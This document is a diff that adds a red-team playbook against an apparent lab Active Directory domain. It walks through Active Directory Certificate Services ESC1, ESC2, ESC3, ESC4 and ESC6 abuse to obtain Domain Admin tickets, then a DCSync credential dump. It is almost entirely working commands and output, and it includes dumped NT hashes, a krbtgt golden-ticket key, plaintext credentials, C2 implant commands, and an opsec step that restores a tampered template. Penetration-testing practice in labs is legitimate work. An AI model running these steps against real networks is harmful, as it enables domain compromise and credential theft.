@@ -422,3 +422,275 @@ shell sqlcmd -S localhost -E -Q "EXEC ('xp_cmdshell ''powershell -c (test-path C
 shell sqlcmd -S localhost -E -Q "EXEC ('xp_cmdshell ''cmd /c start /b C:\\Windows\\Temp\\WmiPrvSE.exe''') AT [BRAAVOS]"
 # → Agent 89f390fb registered
 ```
+
+---
+
+## ADCS ESC1 → DA TGT → DCSYNC (essos.local — 2026-08-02)
+
+**Agent:** `60c58109` — ESSOS\BRAAVOS$ (SYSTEM), dllhost.exe, BRAAVOS (10.10.10.23)  
+**CA:** `ESSOS-CA` on `braavos.essos.local`  
+**Template:** `ESC1` — CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, low-priv enrollment  
+**Target:** `daenerys.targaryen@essos.local` (Domain Admin in essos.local)
+
+### Step 1 — Request ESC1 cert on BRAAVOS (from agent `60c58109` console)
+
+```
+# Create INF
+shell cmd /c echo [Version] > C:\Users\Public\esc1.inf
+shell cmd /c echo Signature="$Windows NT$" >> C:\Users\Public\esc1.inf
+shell cmd /c echo [NewRequest] >> C:\Users\Public\esc1.inf
+shell cmd /c echo Subject = "CN=daenerys" >> C:\Users\Public\esc1.inf
+shell cmd /c echo KeySpec = 1 >> C:\Users\Public\esc1.inf
+shell cmd /c echo KeyLength = 2048 >> C:\Users\Public\esc1.inf
+shell cmd /c echo Exportable = TRUE >> C:\Users\Public\esc1.inf
+shell cmd /c echo MachineKeySet = FALSE >> C:\Users\Public\esc1.inf
+shell cmd /c echo RequestType = CMC >> C:\Users\Public\esc1.inf
+shell cmd /c echo [RequestAttributes] >> C:\Users\Public\esc1.inf
+shell cmd /c echo CertificateTemplate=ESC1 >> C:\Users\Public\esc1.inf
+shell cmd /c echo SAN=upn=daenerys.targaryen@essos.local >> C:\Users\Public\esc1.inf
+
+# Generate CSR
+shell certreq -new C:\Users\Public\esc1.inf C:\Users\Public\esc1.csr
+
+# Submit to CA
+shell certreq -submit -config "braavos.essos.local\ESSOS-CA" C:\Users\Public\esc1.csr C:\Users\Public\da.cer
+
+# Accept/install cert into current user store
+shell certreq -accept C:\Users\Public\da.cer
+
+# Export with private key (password: test123)
+shell certutil -exportpfx -p test123 daenerys C:\Users\Public\da.pfx
+```
+
+**Note:** `certutil -exportpfx` produces AES-256 PFX. Rubeus (via dotnet-exec / forkRunAssembly) cannot load it.
+Download the PFX from the agent loot: `download C:\Users\Public\da.pfx`
+
+### Step 2 — Convert PFX to 3DES legacy format (on Kali)
+
+```bash
+# Extract certs+key from AES-256 PFX
+openssl pkcs12 -in /tmp/da.pfx -out /tmp/da_certs.pem -nodes -passin pass:test123 -legacy 2>/dev/null || \
+openssl pkcs12 -in /tmp/da.pfx -out /tmp/da_certs.pem -nodes -passin pass:test123
+
+# Repack as 3DES (legacy) PFX
+openssl pkcs12 -export -in /tmp/da_certs.pem -out /tmp/da_legacy.pfx -passout pass:test123 -legacy
+
+# Copy to payloads dir so C2 can serve it
+cp /tmp/da_legacy.pfx /home/kali/Documents/endgame/bin/payloads/da_legacy.pfx
+```
+
+### Step 3 — Sync Kali clock with DC (required for Kerberos — ~6h skew otherwise)
+
+```bash
+# Query DC NTP and set Kali UTC clock
+DC_UTC=$(python3 -c "
+import socket, struct, datetime
+NTP_SERVER = '10.10.10.12'
+REF_TIME = 2208988800
+client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+client.settimeout(5)
+data = b'\x1b' + 47 * b'\0'
+client.sendto(data, (NTP_SERVER, 123))
+data, _ = client.recvfrom(1024)
+t = struct.unpack('!12I', data)[10] - REF_TIME
+print(datetime.datetime.fromtimestamp(t, tz=datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S'))
+" 2>/dev/null)
+echo "kali" | sudo -S timedatectl set-ntp false 2>/dev/null
+echo "kali" | sudo -S date -u -s "$DC_UTC"
+```
+
+**Note:** sudo password is `kali`. Disable NTP first or it fights back immediately.
+
+### Step 4 — certipy-ad auth (Kerberos PKINIT → TGT + NT hash)
+
+```bash
+certipy-ad auth \
+  -pfx /tmp/da_legacy.pfx \
+  -dc-ip 10.10.10.12 \
+  -username daenerys.targaryen \
+  -domain essos.local \
+  -password test123
+```
+
+**Output:**
+```
+[*] Got TGT
+[*] Saving credential cache to 'daenerys.targaryen.ccache'
+[*] Got hash for 'daenerys.targaryen@essos.local': aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a
+```
+
+### Step 5 — DCSYNC meereen DC (10.10.10.12)
+
+```bash
+impacket-secretsdump \
+  -hashes aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a \
+  essos.local/daenerys.targaryen@10.10.10.12
+```
+
+**Key hashes obtained:**
+| Account | NT Hash |
+|---------|---------|
+| `Administrator` | `54296a48cd30259cc88095373cec24da` |
+| `krbtgt` | `54e8a405fa033489d82c76cc4ac06b8e` |
+| `daenerys.targaryen` | `34534854d33b398b66684072224bb47a` |
+| `jorah.mormont` | `4d737ec9ecf0b9955a161773cfed9611` |
+| `sql_svc` | `84a5092f53390ea48d660be52b93b804` |
+
+**krbtgt AES256 (Golden Ticket key):**
+`230ca0c6634825ca36a564a5c78717961917893f3560e5f6d8e81723bd7ee099`
+
+### Troubleshooting notes
+
+| Issue | Root cause | Fix |
+|-------|-----------|-----|
+| Rubeus "wrong password" for da.pfx / da_legacy.pfx via `dotnet-exec` | `forkRunAssembly` spawns child process; child fails CryptoAPI cert load | Use certipy-ad from Kali instead (clock sync required) |
+| certipy-ad KRB_AP_ERR_SKEW | Kali ~6h behind DC (lab VM time drift) | Sync clock via NTP query to DC (Step 3 above) |
+| `sudo ntpdate` not found | ntpdate not installed on this Kali | Use python3 NTP query + `sudo date -u -s` |
+| `certutil -exportpfx` AES-256 PFX incompatible with Rubeus | certutil uses AES-256 on modern Windows; Rubeus expects 3DES | OpenSSL `-legacy` repacking (Step 2) or skip Rubeus entirely |
+
+*Last updated: 2026-08-02*
+
+---
+
+## ADCS ESC2 → DA TGT (essos.local — 2026-08-02)
+
+**Vulnerability:** Template `ESC2` has `Any Purpose` EKU — superset of all EKUs including Certificate Request Agent. Holder can request certs on behalf of any domain principal.  
+**Enrollment rights:** Domain Users (BRAAVOS$ machine account rejected — not in Domain Users)  
+**Required creds:** `khal.drogo:horse`
+
+```bash
+# Step 1 — Get ESC2 cert (Any Purpose EKU)
+certipy-ad req \
+  -u khal.drogo@essos.local -p horse \
+  -ca ESSOS-CA -template ESC2 \
+  -dc-ip 10.10.10.12 -target 10.10.10.23 \
+  -out /tmp/esc2_braavos
+# → _tmp_esc2_braavos.pfx (certipy v5.1.0 saves in CWD with _ prefix)
+
+# Step 2 — Use ESC2 cert as enrollment agent → cert for daenerys
+certipy-ad req \
+  -u khal.drogo@essos.local -p horse \
+  -ca ESSOS-CA -template User \
+  -on-behalf-of 'essos\daenerys.targaryen' \
+  -pfx _tmp_esc2_braavos.pfx \
+  -dc-ip 10.10.10.12 -target 10.10.10.23 \
+  -out /tmp/esc2_da
+# → _tmp_esc2_da.pfx with UPN daenerys.targaryen@essos.local
+
+# Step 3 — PKINIT auth
+certipy-ad auth -pfx _tmp_esc2_da.pfx -dc-ip 10.10.10.12 \
+  -username daenerys.targaryen -domain essos.local
+# → NT hash: 34534854d33b398b66684072224bb47a
+```
+
+**Note:** `forge` subcommand fails with `KDC_ERROR_CLIENT_NOT_TRUSTED` — ESC2 path is enrollment-agent abuse, not SubCA forgery.
+
+---
+
+## ADCS ESC3 → DA TGT (essos.local — 2026-08-02)
+
+**Vulnerability:** Two-template chain — `ESC3-CRA` grants Certificate Request Agent EKU to Domain Users; `ESC3` template requires 1 CRA-signed request.
+
+```bash
+# Step 1 — Get enrollment agent cert from ESC3-CRA template
+certipy-ad req \
+  -u khal.drogo@essos.local -p horse \
+  -ca ESSOS-CA -template ESC3-CRA \
+  -dc-ip 10.10.10.12 -target 10.10.10.23 \
+  -out /tmp/esc3_agent
+# → _tmp_esc3_agent.pfx
+
+# Step 2 — Use enrollment agent cert to request DA cert from ESC3 template
+certipy-ad req \
+  -u khal.drogo@essos.local -p horse \
+  -ca ESSOS-CA -template ESC3 \
+  -on-behalf-of 'essos\daenerys.targaryen' \
+  -pfx _tmp_esc3_agent.pfx \
+  -dc-ip 10.10.10.12 -target 10.10.10.23 \
+  -out /tmp/esc3_da
+# → _tmp_esc3_da.pfx with UPN daenerys.targaryen@essos.local
+
+# Step 3 — PKINIT auth
+certipy-ad auth -pfx _tmp_esc3_da.pfx -dc-ip 10.10.10.12 \
+  -username daenerys.targaryen -domain essos.local
+# → NT hash: 34534854d33b398b66684072224bb47a
+```
+
+---
+
+## ADCS ESC6 → DA TGT (essos.local — 2026-08-02)
+
+**Vulnerability:** ESSOS-CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set — ANY enrollable template accepts user-supplied SAN UPN.  
+**Also confirmed on CA:** ESC8 (HTTP web enrollment), ESC11 (unencrypted RPC)  
+**Template used:** `Machine` (enrollable by Domain Computers — BRAAVOS$ works here)  
+**Named `ESC6` template does NOT exist** on the CA.
+
+```bash
+# Request cert via Machine template with injected SAN UPN
+certipy-ad req \
+  -hashes :a8deae4a7570cc3ccb695663fe0d43a6 \
+  -u 'BRAAVOS$'@essos.local \
+  -ca ESSOS-CA -template Machine \
+  -upn daenerys.targaryen@essos.local \
+  -dc-ip 10.10.10.12 -target 10.10.10.23 \
+  -out /tmp/esc6_da
+# → _tmp_esc6_da.pfx
+
+# PKINIT auth
+certipy-ad auth -pfx _tmp_esc6_da.pfx -dc-ip 10.10.10.12 \
+  -username daenerys.targaryen -domain essos.local
+# → NT hash: 34534854d33b398b66684072224bb47a
+```
+
+---
+
+## ADCS ESC4 → DA TGT (essos.local — 2026-08-02)
+
+**Vulnerability:** `khal.drogo` has `Full Control + WriteDacl + WriteOwner` on the `ESC4` template object.  
+**Original state:** `msPKI-RA-Signature=1`, `msPKI-Enrollment-Flag=43` (manager approval), Code Signing EKU only.  
+**After modification:** `msPKI-RA-Signature=0`, `msPKI-Enrollment-Flag=0`, `msPKI-Certificate-Name-Flag=1` (enrollee supplies subject), Client Authentication EKU.
+
+```bash
+# Step 1 — Save original template config
+certipy-ad template \
+  -u khal.drogo@essos.local -p horse \
+  -dc-ip 10.10.10.12 -template ESC4 -save-old
+# → ESC4.json saved in CWD
+
+# Step 2 — Overwrite template with vulnerable defaults
+certipy-ad template \
+  -u khal.drogo@essos.local -p horse \
+  -dc-ip 10.10.10.12 -template ESC4 -write-default-configuration
+# Sets: RA-Signature=0, Enrollment-Flag=0, CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, Client Auth EKU
+
+# Step 3 — Request DA cert
+certipy-ad req \
+  -u khal.drogo@essos.local -p horse \
+  -ca ESSOS-CA -template ESC4 \
+  -upn daenerys.targaryen@essos.local \
+  -dc-ip 10.10.10.12 -target 10.10.10.23
+# Request ID 13 → cert with UPN daenerys.targaryen@essos.local
+
+# Step 4 — Restore original (opsec)
+certipy-ad template \
+  -u khal.drogo@essos.local -p horse \
+  -dc-ip 10.10.10.12 -template ESC4 -configuration ESC4.json
+
+# Step 5 — Auth
+certipy-ad auth -pfx esc4_da.pfx -dc-ip 10.10.10.12 \
+  -username daenerys.targaryen -domain essos.local
+# → NT hash: 34534854d33b398b66684072224bb47a
+```
+
+---
+
+## ADCS — Common Gotchas (certipy-ad v5.1.0)
+
+| Issue | Fix |
+|-------|-----|
+| BRAAVOS$ rejected from Domain Users templates (ESC1, ESC2, ESC3-CRA, ESC3) | Use `khal.drogo:horse` instead |
+| BRAAVOS$ works for Machine/Authenticated Users templates (ESC6) | Use `-hashes :a8deae4a7570cc3ccb695663fe0d43a6` |
+| RPC dynamic endpoint not resolvable via DC | Always add `-target 10.10.10.23` to reach CA directly |
+| certipy saves files in CWD with `_tmp_` prefix not at `-out` path | Files end up in CWD as `_tmp_esc2_braavos.pfx` etc. |
+| Named ESC6 template doesn't exist | Use `Machine` template + CA-level EDITF flag |
+| Kerberos clock skew | Sync Kali clock before each session (Step 3 in ESC1 section) |
